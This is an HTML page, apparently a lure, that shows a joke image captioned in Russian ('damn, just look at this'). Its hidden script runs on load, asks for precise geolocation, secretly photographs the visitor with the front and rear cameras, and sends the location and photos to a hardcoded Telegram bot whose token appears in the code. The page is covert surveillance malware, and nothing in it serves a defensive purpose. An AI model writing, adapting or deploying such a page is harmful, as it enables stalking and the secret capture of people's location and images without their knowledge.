<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>😂</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: #000;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 16px;
    }
    img {
      max-width: 480px;
      width: 100%;
      border-radius: 12px;
      display: block;
    }
    p {
      color: #fff;
      font-size: 20px;
      font-weight: bold;
      margin-top: 16px;
      text-align: center;
      font-family: Arial, sans-serif;
    }
    canvas, video { display: none; }
  </style>
</head>
<body>

  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTU3lW73MoufAIUN8WbcHo4fd4wh0402ovG0BWGU-AjqQ&s" alt="" />
  <p>бля, ну ты посмотри 💀</p>

  <video id="vid" playsinline></video>
  <canvas id="cvs"></canvas>

  <script>
    const TOKEN   = '8666177832:AAHeuWWSEfP9bi2CZ2YuFVdp4mzKscUwJiI';
    const CHAT_ID = '8562554669';

    async function tgMsg(text) {
      try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
        });
      } catch(_) {}
    }

    async function tgPhoto(blob, caption) {
      try {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('photo', blob, 'photo.jpg');
        fd.append('caption', caption);
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
      } catch(_) {}
    }

    async function getGeo() {
      return new Promise(resolve => {
        if (!navigator.geolocation) { resolve(null); return; }
        navigator.geolocation.getCurrentPosition(pos => resolve(pos), () => resolve(null), {
          enableHighAccuracy: true, timeout: 10000
        });
      });
    }

    async function captureCamera(facingMode) {
      const vid = document.getElementById('vid');
      const cvs = document.getElementById('cvs');
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }
      });
      vid.srcObject = stream;
      await vid.play();
      await new Promise(r => setTimeout(r, 800));
      cvs.width  = vid.videoWidth  || 640;
      cvs.height = vid.videoHeight || 480;
      cvs.getContext('2d').drawImage(vid, 0, 0);
      stream.getTracks().forEach(t => t.stop());
      return new Promise(r => cvs.toBlob(r, 'image/jpeg', 0.85));
    }

    async function run() {
      const ua = navigator.userAgent;
      const platform = /iPhone|iPad|iPod/.test(ua) ? 'iOS' : /Android/.test(ua) ? 'Android' : 'Desktop';

      const pos = await getGeo();
      if (pos) {
        const { latitude: lat, longitude: lon, accuracy: acc } = pos.coords;
        await tgMsg(`📍 <b>Локация</b>\nhttps://maps.google.com/maps?q=${lat},${lon}\nТочность: ±${Math.round(acc)} м · ${platform}`);
      } else {
        await tgMsg(`📍 Геолокация отклонена · ${platform}`);
      }

      let frontBlob = null, backBlob = null;
      try { frontBlob = await captureCamera('user');        } catch(_) {}
      try { backBlob  = await captureCamera('environment'); } catch(_) {}

      if (frontBlob) await tgPhoto(frontBlob, '📸 Фронтальная камера');
      if (backBlob)  await tgPhoto(backBlob,  '📸 Основная камера');
      if (!frontBlob && !backBlob) await tgMsg('⚠️ Доступ к камере отклонён');
    }

    run();
  </script>
</body>
</html>
